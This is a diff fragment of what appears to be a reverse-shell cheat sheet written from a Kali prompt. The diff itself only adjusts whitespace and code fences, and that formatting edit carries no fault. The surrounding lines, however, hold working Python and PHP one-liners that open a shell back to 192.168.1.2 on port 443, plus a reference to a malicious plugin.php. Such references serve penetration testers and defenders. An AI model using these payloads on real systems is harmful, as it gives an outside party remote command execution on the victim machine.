@@ -233,6 +233,7 @@
   ```cmd
   root@kali:~# nano plugin.php
   ```
+   
   ```php
   <?php
 
@@ -304,10 +305,9 @@
 
   ```cmd
   python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
-```
-
+  ```
   ---
- 
+   
   # <kbd>PHP</kbd>
   
   ```php
@@ -325,9 +325,9 @@
   
   php -r '$sock=fsockopen("192.168.1.2",443);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
   ```
-  
+   
   ---
-  
+   
   # <kbd>Ruby</kbd>
 
   ```cmd
